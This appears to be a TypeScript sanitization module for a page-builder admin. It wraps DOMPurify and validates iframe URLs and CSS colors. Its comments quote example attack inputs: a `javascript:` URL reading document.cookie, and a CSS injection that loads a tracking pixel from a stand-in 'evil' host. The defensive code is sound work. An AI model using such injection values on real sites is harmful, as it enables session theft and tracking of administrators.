/**
 * HTML sanitization for any user-authored content rendered with `{@html}`.
 *
 * Page-builder blocks (rich text, embed, columns) store HTML written by
 * content editors. Without sanitization, an editor with low privileges
 * can inject `<script>` that runs in the session of any admin who later
 * opens the page in preview — a privilege escalation.
 *
 * We wrap DOMPurify with a single `safeHtml()` so the call sites don't
 * have to know which config to pass. SSR is disabled in (admin), so a
 * window-bound DOMPurify is fine — but the SSR-safety check below
 * keeps us honest if that ever changes.
 */

import DOMPurify from 'dompurify';

const ALLOWED_TAGS = [
  'a',
  'b',
  'i',
  'em',
  'strong',
  'u',
  's',
  'br',
  'p',
  'span',
  'div',
  'ul',
  'ol',
  'li',
  'blockquote',
  'code',
  'pre',
  'h1',
  'h2',
  'h3',
  'h4',
  'h5',
  'h6',
  'img',
  'figure',
  'figcaption',
  'table',
  'thead',
  'tbody',
  'tr',
  'th',
  'td',
  'hr',
];

const ALLOWED_ATTRS = [
  'href',
  'src',
  'alt',
  'title',
  'target',
  'rel',
  'class',
  'style',
  'colspan',
  'rowspan',
];

/**
 * Sanitize untrusted HTML before handing it to `{@html ...}`.
 *
 * DOMPurify already blocks script/iframe/object/embed and event-handler
 * attributes (on*), and rewrites unsafe href/src protocols. We add an
 * extra `ALLOWED_TAGS`/`ALLOWED_ATTRS` belt-and-braces in case the
 * upstream defaults loosen.
 */
export function safeHtml(html: unknown): string {
  if (typeof html !== 'string' || html.length === 0) return '';
  if (typeof window === 'undefined') {
    // SSR fallback: strip everything between tags. (admin) routes have
    // SSR disabled, so we only land here on accident — strip rather
    // than ship raw HTML to the response stream.
    return html.replace(/<[^>]*>/g, '');
  }
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS,
    ALLOWED_ATTR: ALLOWED_ATTRS,
    // Force target="_blank" links to also get rel="noopener noreferrer"
    // so the opener window can't be hijacked.
    ADD_ATTR: ['rel'],
    // Block dangerous URL schemes even on allowed tags.
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|#|\/)/i,
  });
}

/**
 * Restrict an iframe `src` (or any URL going into an attribute that
 * navigates) to http/https. Anything else — `javascript:`, `data:`,
 * `vbscript:`, `file:` — collapses to `about:blank`.
 *
 * Page-builder embed blocks let the user type a URL; without this an
 * editor can write `javascript:alert(document.cookie)` and pop the
 * admin's session when they preview the page.
 */
export function safeIframeSrc(url: unknown): string {
  if (typeof url !== 'string' || url.length === 0) return 'about:blank';
  const trimmed = url.trim();
  // Allow protocol-relative and absolute http(s) URLs only.
  if (/^https?:\/\//i.test(trimmed)) return trimmed;
  if (/^\/\//.test(trimmed)) return `https:${trimmed}`;
  return 'about:blank';
}

const CSS_COLOR_RE = /^(?:#[0-9a-f]{3,8}|rgba?\([^)]{0,80}\)|hsla?\([^)]{0,80}\)|[a-z]{3,20})$/i;

/**
 * Validate a user-supplied CSS color before splicing it into an inline
 * `style="..."` attribute. Without this, a value like
 * `red; background-image: url(https://evil/track?id=1)` would let a
 * page-builder writer exfiltrate any admin's IP via a tracking pixel
 * the moment they preview the page.
 */
export function safeCssColor(value: unknown, fallback: string): string {
  if (typeof value !== 'string') return fallback;
  const trimmed = value.trim();
  if (trimmed.length === 0 || trimmed.length > 100) return fallback;
  return CSS_COLOR_RE.test(trimmed) ? trimmed : fallback;
}
